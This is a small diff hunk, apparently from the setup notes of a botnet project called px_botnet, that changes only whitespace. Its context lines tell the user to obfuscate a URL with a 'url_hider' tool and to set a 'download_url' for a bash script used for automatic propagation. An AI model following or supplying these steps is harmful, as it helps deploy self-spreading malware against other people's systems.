@@ -49,7 +49,7 @@ cd BOT && make
 cd url_hider && ./url_hider "your url"
 
 Edit includes/px_botnet.h - stringifer with your url hided
-						  - download_url with url of bash script for the auto propagation
+                          - download_url with url of bash script for the auto propagation
 
 make re
 
